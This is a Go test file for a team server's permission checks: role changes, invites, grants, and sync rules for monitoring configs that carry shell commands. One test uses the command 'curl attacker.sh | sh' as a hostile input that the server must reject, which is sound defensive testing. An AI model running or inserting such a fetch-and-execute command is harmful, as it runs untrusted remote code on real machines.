package server

import (
	"crypto/x509"
	"encoding/json"
	"net/http"
	"strconv"
	"strings"
	"testing"

	"github.com/pocketcmd/pocketcmd-server/internal/authz"
	"github.com/pocketcmd/pocketcmd-server/internal/datasync"
	"github.com/pocketcmd/pocketcmd-server/internal/pki"
)

func TestOwner_NonOwnerAdminCannotChangeRoles(t *testing.T) {
	f := newTeamTestFixture(t)
	admin2Cert, admin2Token, _ := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "admin")

	w := f.do("PATCH", "/api/users/"+f.memberUser.UserID, `{"role":"admin"}`, admin2Token, admin2Cert)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]string
	json.NewDecoder(w.Body).Decode(&resp)
	if resp["error"] != "owner_required" {
		t.Errorf("expected owner_required, got %q", resp["error"])
	}
}

func TestOwner_OwnerPromotesAndDemotes(t *testing.T) {
	f := newTeamTestFixture(t)

	w := f.do("PATCH", "/api/users/"+f.memberUser.UserID, `{"role":"admin"}`, f.adminToken, f.adminCert)
	if w.Code != http.StatusOK {
		t.Fatalf("promote: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	w = f.do("PATCH", "/api/users/"+f.memberUser.UserID, `{"role":"member"}`, f.adminToken, f.adminCert)
	if w.Code != http.StatusOK {
		t.Fatalf("demote: expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

func TestOwner_NonOwnerAdminCannotCreateAdminInvite(t *testing.T) {
	f := newTeamTestFixture(t)
	admin2Cert, admin2Token, _ := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "admin")

	w := f.do("POST", "/api/invites", `{"role":"admin"}`, admin2Token, admin2Cert)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", w.Code, w.Body.String())
	}
	w = f.do("POST", "/api/invites", `{"role":"admin"}`, f.adminToken, f.adminCert)
	if w.Code != http.StatusOK {
		t.Fatalf("owner admin-invite: expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

func TestOwner_NonOwnerAdminCannotDeleteAdmin(t *testing.T) {
	f := newTeamTestFixture(t)
	_, _, admin2 := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "admin")
	admin3Cert, admin3Token, _ := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "dave", "admin")

	w := f.do("DELETE", "/api/users/"+admin2.UserID, "", admin3Token, admin3Cert)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", w.Code, w.Body.String())
	}
	w = f.do("DELETE", "/api/users/"+admin2.UserID, "", f.adminToken, f.adminCert)
	if w.Code != http.StatusOK {
		t.Fatalf("owner delete admin: expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

func TestOwner_ListUsersExposesOwnerFlag(t *testing.T) {
	f := newTeamTestFixture(t)
	w := f.do("GET", "/api/users", "", f.memberToken, f.memberCert)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	var list []map[string]interface{}
	json.NewDecoder(w.Body).Decode(&list)
	foundOwner := false
	for _, u := range list {
		if u["user_id"] == f.adminUser.UserID && u["owner"] == true {
			foundOwner = true
		}
	}
	if !foundOwner {
		t.Error("owner flag not exposed in /api/users")
	}
}

func TestPermissions_AdminGrantsAndMemberSeesOwn(t *testing.T) {
	f := newTeamTestFixture(t)

	body := `{"permissions":{"metrics.commands.create":{"granted":true},"alerts.read":{"granted":true,"metrics":["custom:cpu"]}}}`
	w := f.do("PATCH", "/api/users/"+f.memberUser.UserID, body, f.adminToken, f.adminCert)
	if w.Code != http.StatusOK {
		t.Fatalf("grant: expected 200, got %d: %s", w.Code, w.Body.String())
	}

	w = f.do("GET", "/api/users", "", f.memberToken, f.memberCert)
	var list []map[string]interface{}
	json.NewDecoder(w.Body).Decode(&list)
	for _, u := range list {
		if u["user_id"] == f.memberUser.UserID {
			perms, _ := u["permissions"].(map[string]interface{})
			if perms == nil {
				t.Fatal("member should see own permissions")
			}
			if _, ok := perms["metrics.commands.create"]; !ok {
				t.Error("granted key missing from member's own view")
			}
		} else if u["permissions"] != nil {
			t.Error("member should not see other users' permissions")
		}
	}
}

func TestPermissions_MemberCannotGrant(t *testing.T) {
	f := newTeamTestFixture(t)
	body := `{"permissions":{"users.manage":{"granted":true}}}`
	w := f.do("PATCH", "/api/users/"+f.memberUser.UserID, body, f.memberToken, f.memberCert)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", w.Code, w.Body.String())
	}
}

func TestPermissions_UnknownKeyRejected(t *testing.T) {
	f := newTeamTestFixture(t)
	body := `{"permissions":{"bogus.key":{"granted":true}}}`
	w := f.do("PATCH", "/api/users/"+f.memberUser.UserID, body, f.adminToken, f.adminCert)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestPermissions_AdminTargetTakesOwnerGrantedKeysOnly(t *testing.T) {
	f := newTeamTestFixture(t)
	_, _, admin2 := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "admin")
	body := `{"permissions":{"users.manage":{"granted":true}}}`
	w := f.do("PATCH", "/api/users/"+admin2.UserID, body, f.adminToken, f.adminCert)
	if w.Code != http.StatusBadRequest || !strings.Contains(w.Body.String(), "target_not_member") {
		t.Fatalf("expected 400 target_not_member, got %d: %s", w.Code, w.Body.String())
	}
	w = f.do("PATCH", "/api/users/"+admin2.UserID, `{"permissions":{"nope":{"granted":true}}}`, f.adminToken, f.adminCert)
	if w.Code != http.StatusBadRequest || !strings.Contains(w.Body.String(), "invalid_permissions") {
		t.Fatalf("expected 400 invalid_permissions, got %d: %s", w.Code, w.Body.String())
	}
}

func TestPermissions_UsersManageGrantAllowsMemberRemoval(t *testing.T) {
	f := newTeamTestFixture(t)
	carolCert, carolToken, carol := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "member")
	if err := f.users.SetPermissions(carol.UserID, pki.PermissionSet{
		authz.PermUsersManage: {Granted: true},
	}); err != nil {
		t.Fatal(err)
	}

	w := f.do("DELETE", "/api/users/"+f.memberUser.UserID, "", carolToken, carolCert)
	if w.Code != http.StatusOK {
		t.Fatalf("users.manage member removal: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	w = f.do("DELETE", "/api/users/"+f.adminUser.UserID, "", carolToken, carolCert)
	if w.Code == http.StatusOK {
		t.Fatal("users.manage must not allow removing admins/owner")
	}
}

func syncFixture(t *testing.T) (*teamTestFixture, *datasync.SyncStore) {
	t.Helper()
	f := newTeamTestFixture(t)
	store := newTestSyncStore(t)
	f.srv.RegisterSyncRoutes(store)
	return f, store
}

func (f *teamTestFixture) push(t *testing.T, body, token string, cert *x509.Certificate) datasync.PushResult {
	t.Helper()
	w := f.do("POST", "/api/sync/push", body, token, cert)
	if w.Code != http.StatusOK {
		t.Fatalf("push endpoint should 200 with per-record rejects, got %d: %s", w.Code, w.Body.String())
	}
	var res datasync.PushResult
	if err := json.NewDecoder(w.Body).Decode(&res); err != nil {
		t.Fatalf("decode push result: %v", err)
	}
	return res
}

func expectPolicyDenied(t *testing.T, res datasync.PushResult, what string) {
	t.Helper()
	if len(res.Accepted) != 0 || len(res.Rejected) != 1 || res.Rejected[0].Reason != datasync.RejectPolicyDenied {
		t.Fatalf("%s must be rejected as policy_denied, got %+v", what, res)
	}
}

func TestSyncPolicy_MemberWithoutGrantCannotWriteMonitoringConfig(t *testing.T) {
	f, _ := syncFixture(t)
	body := `{"records":[{"id":"monitoring_config","type":"monitoring_config","updated_at":1000,
		"data":{"default_interval_seconds":30,"retention_days":7,
		"custom_metrics":[{"id":"evil","label":"Evil","command":"curl attacker.sh | sh"}]}}]}`
	expectPolicyDenied(t, f.push(t, body, f.memberToken, f.memberCert), "member defining a command")
}

func TestSyncPolicy_CommandsNeedCreateGrant(t *testing.T) {
	f, _ := syncFixture(t)
	push := func(body string) datasync.PushResult {
		t.Helper()
		return f.push(t, body, f.memberToken, f.memberCert)
	}
	grant := func(perms ...string) {
		t.Helper()
		set := pki.PermissionSet{}
		for _, p := range perms {
			set[p] = pki.Grant{Granted: true}
		}
		if err := f.users.SetPermissions(f.memberUser.UserID, set); err != nil {
			t.Fatal(err)
		}
	}
	withCommand := func(ts int, command string) string {
		return `{"records":[{"id":"monitoring_config","type":"monitoring_config","updated_at":` +
			strconv.Itoa(ts) + `,"data":{"default_interval_seconds":30,"retention_days":7,` +
			`"custom_metrics":[{"id":"ok","label":"OK","command":"` + command + `"}]}}]}`
	}

	grant(authz.PermMetricsCommandsUpdate)
	expectPolicyDenied(t, push(withCommand(1000, "echo 1")), "member without create adding a command")

	grant(authz.PermMetricsCommandsCreate, authz.PermMetricsCommandsUpdate)
	if res := push(withCommand(2000, "echo 1")); len(res.Accepted) != 1 {
		t.Fatalf("member with create adding a command should be accepted, got %+v", res)
	}

	grant(authz.PermMetricsCommandsUpdate)
	expectPolicyDenied(t, push(withCommand(3000, "echo 2")), "member without create changing a command")
	grant(authz.PermMetricsCommandsCreate, authz.PermMetricsCommandsUpdate)
	if res := push(withCommand(4000, "echo 2")); len(res.Accepted) != 1 {
		t.Fatalf("member with create and update changing a command should be accepted, got %+v", res)
	}
}

func TestSyncPolicy_NonOwnerAdminNeedsCreateGrant(t *testing.T) {
	f, _ := syncFixture(t)
	adminCert, adminToken, admin := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "erin", "admin")
	record := func(updatedAt int, custom string) string {
		return `{"records":[{"id":"monitoring_config","type":"monitoring_config","updated_at":` +
			strconv.Itoa(updatedAt) + `,"data":{"default_interval_seconds":60,"retention_days":7,` +
			`"custom_metrics":[` + custom + `]}}]}`
	}
	if res := f.push(t, record(1000, ""), adminToken, adminCert); len(res.Accepted) != 1 {
		t.Fatalf("ungranted admin seeding interval/retention should be accepted, got %+v", res)
	}
	expectPolicyDenied(t, f.push(t, record(2000, `{"id":"a","label":"A","command":"echo 1"}`), adminToken, adminCert),
		"ungranted admin adding a command")
	if res := f.push(t, record(3000, `{"id":"a","label":"A","command":"echo 1"}`), f.adminToken, f.adminCert); len(res.Accepted) != 1 {
		t.Fatalf("owner defining a command should be accepted, got %+v", res)
	}
	expectPolicyDenied(t, f.push(t, record(4000, `{"id":"a","label":"A","command":"echo 2"}`), adminToken, adminCert),
		"ungranted admin changing a command body")
	if res := f.push(t, record(5000, `{"id":"a","label":"Renamed","command":"echo 1"}`), adminToken, adminCert); len(res.Accepted) != 1 {
		t.Fatalf("ungranted admin relabeling a command should be accepted, got %+v", res)
	}
	if err := f.users.SetPermissions(admin.UserID, pki.PermissionSet{
		"metrics.commands.create": {Granted: true},
	}); err != nil {
		t.Fatal(err)
	}
	if res := f.push(t, record(6000, `{"id":"a","label":"Renamed","command":"echo 2"}`), adminToken, adminCert); len(res.Accepted) != 1 {
		t.Fatalf("granted admin changing a command body should be accepted, got %+v", res)
	}
}

func TestSyncPolicy_AdminWritesMonitoringConfig(t *testing.T) {
	f, _ := syncFixture(t)
	body := `{"records":[{"id":"monitoring_config","type":"monitoring_config","updated_at":1000,
		"data":{"default_interval_seconds":30,"retention_days":7,
		"custom_metrics":[{"id":"a","label":"A","command":"echo 1"}]}}]}`
	w := f.do("POST", "/api/sync/push", body, f.adminToken, f.adminCert)
	var res struct {
		Accepted []string `json:"accepted"`
	}
	json.NewDecoder(w.Body).Decode(&res)
	if len(res.Accepted) != 1 {
		t.Fatalf("admin config write should be accepted, got %s", w.Body.String())
	}
}

func TestSyncPolicy_SSHKeyRequiresGrant(t *testing.T) {
	f, _ := syncFixture(t)
	// Raw-registry members have no default permissions, so bob lacks sshkeys.sync.
	body := `{"records":[{"id":"key1","type":"ssh_key","updated_at":1000,"data":{"blob":"x"}}]}`
	expectPolicyDenied(t, f.push(t, body, f.memberToken, f.memberCert), "ungranted ssh_key write")

	if err := f.users.SetPermissions(f.memberUser.UserID, pki.PermissionSet{
		authz.PermSSHKeysSync: {Granted: true},
	}); err != nil {
		t.Fatal(err)
	}
	if res := f.push(t, body, f.memberToken, f.memberCert); len(res.Accepted) != 1 {
		t.Fatalf("granted ssh_key write should be accepted, got %+v", res)
	}
}

func TestSyncPolicy_MonitoringConfigHiddenWithoutReadGrant(t *testing.T) {
	f, _ := syncFixture(t)
	body := `{"records":[{"id":"monitoring_config","type":"monitoring_config","updated_at":1000,
		"data":{"default_interval_seconds":30,"retention_days":7}}]}`
	f.do("POST", "/api/sync/push", body, f.adminToken, f.adminCert)

	w := f.do("POST", "/api/sync/pull", `{"ids":["monitoring_config"]}`, f.memberToken, f.memberCert)
	var pull struct {
		Records []map[string]interface{} `json:"records"`
	}
	json.NewDecoder(w.Body).Decode(&pull)
	if len(pull.Records) != 0 {
		t.Fatalf("ungranted member should not see monitoring_config, got %v", pull.Records)
	}

	if err := f.users.SetPermissions(f.memberUser.UserID, pki.PermissionSet{
		authz.PermMetricsCommandsRead: {Granted: true},
	}); err != nil {
		t.Fatal(err)
	}
	w = f.do("POST", "/api/sync/pull", `{"ids":["monitoring_config"]}`, f.memberToken, f.memberCert)
	json.NewDecoder(w.Body).Decode(&pull)
	if len(pull.Records) != 1 {
		t.Fatalf("granted member should see monitoring_config, got %v", pull.Records)
	}
}

func storedGrant(t *testing.T, f *teamTestFixture, userID, perm string) bool {
	t.Helper()
	u, err := f.users.FindByID(userID)
	if err != nil || u == nil {
		t.Fatalf("find %s: %v", userID, err)
	}
	return u.Permissions[perm].Granted
}

func TestPermissions_OwnerGrantsCreateToAdminAndMember(t *testing.T) {
	f := newTeamTestFixture(t)
	_, _, admin2 := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "admin")
	body := `{"permissions":{"metrics.commands.create":{"granted":true}}}`
	for _, id := range []string{admin2.UserID, f.memberUser.UserID} {
		w := f.do("PATCH", "/api/users/"+id, body, f.adminToken, f.adminCert)
		if w.Code != http.StatusOK {
			t.Fatalf("owner grant to %s: expected 200, got %d: %s", id, w.Code, w.Body.String())
		}
		if !storedGrant(t, f, id, "metrics.commands.create") {
			t.Fatalf("grant to %s not stored", id)
		}
	}
}

func TestPermissions_OwnerRevokesCreateFromAdmin(t *testing.T) {
	f, _ := requestFixture(t)
	admin2Cert, admin2Token, admin2 := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "admin")
	w := f.do("PATCH", "/api/users/"+admin2.UserID,
		`{"permissions":{"metrics.commands.create":{"granted":true}}}`, f.adminToken, f.adminCert)
	if w.Code != http.StatusOK {
		t.Fatalf("owner grant: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	w = f.do("POST", "/api/metrics/requests", `{"label":"X","command":"echo 1"}`, f.memberToken, f.memberCert)
	var req struct {
		ID string `json:"id"`
	}
	if err := json.NewDecoder(w.Body).Decode(&req); err != nil || req.ID == "" {
		t.Fatalf("file request: %d %s (%v)", w.Code, w.Body.String(), err)
	}
	w = f.do("PATCH", "/api/users/"+admin2.UserID,
		`{"permissions":{"metrics.commands.create":{"granted":false}}}`, f.adminToken, f.adminCert)
	if w.Code != http.StatusOK {
		t.Fatalf("owner revoke: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if storedGrant(t, f, admin2.UserID, "metrics.commands.create") {
		t.Fatal("revoke did not clear the grant")
	}
	w = f.do("POST", "/api/metrics/requests/"+req.ID+"/approve", "", admin2Token, admin2Cert)
	if w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "permission_required") {
		t.Fatalf("revoked admin approve: expected 403 permission_required, got %d: %s", w.Code, w.Body.String())
	}
}

func TestPermissions_AdminCannotChangeCreateGrant(t *testing.T) {
	f := newTeamTestFixture(t)
	_, _, admin2 := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "admin")
	a2Cert, a2Token, _ := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "dan", "admin")
	w := f.do("PATCH", "/api/users/"+f.memberUser.UserID,
		`{"permissions":{"metrics.commands.create":{"granted":true}}}`, a2Token, a2Cert)
	if w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "owner_required") {
		t.Fatalf("admin granting create: expected 403 owner_required, got %d: %s", w.Code, w.Body.String())
	}
	w = f.do("PATCH", "/api/users/"+admin2.UserID,
		`{"permissions":{"metrics.commands.create":{"granted":true}}}`, a2Token, a2Cert)
	if w.Code != http.StatusForbidden {
		t.Fatalf("admin granting create to an admin: expected 403, got %d: %s", w.Code, w.Body.String())
	}
	if err := f.users.SetPermissions(f.memberUser.UserID, pki.PermissionSet{
		"metrics.commands.create": {Granted: true},
	}); err != nil {
		t.Fatal(err)
	}
	w = f.do("PATCH", "/api/users/"+f.memberUser.UserID,
		`{"permissions":{"metrics.commands.create":{"granted":false}}}`, a2Token, a2Cert)
	if w.Code != http.StatusForbidden {
		t.Fatalf("admin revoking create: expected 403, got %d: %s", w.Code, w.Body.String())
	}
	if !storedGrant(t, f, f.memberUser.UserID, "metrics.commands.create") {
		t.Fatal("a refused revoke must leave the grant in place")
	}
}

func TestPermissions_AdminEditKeepsCreateGrant(t *testing.T) {
	f := newTeamTestFixture(t)
	a2Cert, a2Token, _ := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "dan", "admin")
	if err := f.users.SetPermissions(f.memberUser.UserID, pki.PermissionSet{
		"metrics.commands.create": {Granted: true},
	}); err != nil {
		t.Fatal(err)
	}
	for _, body := range []string{
		`{"permissions":{"invites.manage":{"granted":true}}}`,
		`{"permissions":{"invites.manage":{"granted":true},"metrics.commands.create":{"granted":true}}}`,
	} {
		w := f.do("PATCH", "/api/users/"+f.memberUser.UserID, body, a2Token, a2Cert)
		if w.Code != http.StatusOK {
			t.Fatalf("admin edit %s: expected 200, got %d: %s", body, w.Code, w.Body.String())
		}
		if !storedGrant(t, f, f.memberUser.UserID, "metrics.commands.create") {
			t.Fatalf("admin edit %s dropped the owner's grant", body)
		}
		if !storedGrant(t, f, f.memberUser.UserID, "invites.manage") {
			t.Fatalf("admin edit %s did not apply", body)
		}
	}
}

func TestPermissions_AdminCannotReshapeCreateGrant(t *testing.T) {
	f := newTeamTestFixture(t)
	a2Cert, a2Token, _ := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "dan", "admin")
	if err := f.users.SetPermissions(f.memberUser.UserID, pki.PermissionSet{
		"metrics.commands.create": {Granted: true, Metrics: []string{"custom:owner-set"}},
	}); err != nil {
		t.Fatal(err)
	}
	for _, body := range []string{
		`{"permissions":{"metrics.commands.create":{"granted":true,"metrics":["custom:admin-set"]}}}`,
		`{"permissions":{"metrics.commands.create":{"granted":true}}}`,
	} {
		w := f.do("PATCH", "/api/users/"+f.memberUser.UserID, body, a2Token, a2Cert)
		if w.Code != http.StatusOK {
			t.Fatalf("admin resend %s: expected 200, got %d: %s", body, w.Code, w.Body.String())
		}
		u, err := f.users.FindByID(f.memberUser.UserID)
		if err != nil {
			t.Fatal(err)
		}
		g := u.Permissions["metrics.commands.create"]
		if !g.Granted || len(g.Metrics) != 1 || g.Metrics[0] != "custom:owner-set" {
			t.Fatalf("admin resend %s changed the owner's grant: %+v", body, g)
		}
	}
	_, _, carol := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "member")
	w := f.do("PATCH", "/api/users/"+carol.UserID,
		`{"permissions":{"metrics.commands.create":{"granted":false,"metrics":["custom:junk"]}}}`, a2Token, a2Cert)
	if w.Code != http.StatusOK {
		t.Fatalf("admin sending an unchanged false: expected 200, got %d: %s", w.Code, w.Body.String())
	}
	u, err := f.users.FindByID(carol.UserID)
	if err != nil {
		t.Fatal(err)
	}
	if _, stored := u.Permissions["metrics.commands.create"]; stored {
		t.Fatalf("admin materialized an owner-granted key: %+v", u.Permissions)
	}
}

func TestPermissions_OwnerOmissionRevokesCreateGrant(t *testing.T) {
	f := newTeamTestFixture(t)
	_, _, admin2 := newTeamUserDevice(t, f.devices, f.users, f.mgr, f.serverKey, "carol", "admin")
	cases := []struct{ id, body string }{
		{f.memberUser.UserID, `{"permissions":{"invites.manage":{"granted":true}}}`},
		{f.memberUser.UserID, `{"permissions":{}}`},
		{admin2.UserID, `{"permissions":{}}`},
	}
	for _, c := range cases {
		if err := f.users.SetPermissions(c.id, pki.PermissionSet{
			"metrics.commands.create": {Granted: true},
			"alerts.read":             {Granted: true},
		}); err != nil {
			t.Fatal(err)
		}
		w := f.do("PATCH", "/api/users/"+c.id, c.body, f.adminToken, f.adminCert)
		if w.Code != http.StatusOK {
			t.Fatalf("owner edit %s on %s: expected 200, got %d: %s", c.body, c.id, w.Code, w.Body.String())
		}
		if storedGrant(t, f, c.id, "metrics.commands.create") {
			t.Fatalf("owner edit %s on %s left the grant in place", c.body, c.id)
		}
	}
	if !storedGrant(t, f, admin2.UserID, "alerts.read") {
		t.Fatal("owner edit on an admin dropped its stored member grants")
	}
}

func TestPermissions_OwnerRecordImmutable(t *testing.T) {
	f := newTeamTestFixture(t)
	w := f.do("PATCH", "/api/users/"+f.adminUser.UserID,
		`{"permissions":{"metrics.commands.create":{"granted":false}}}`, f.adminToken, f.adminCert)
	if w.Code != http.StatusConflict {
		t.Fatalf("owner permissions: expected 409 owner_immutable, got %d: %s", w.Code, w.Body.String())
	}
}
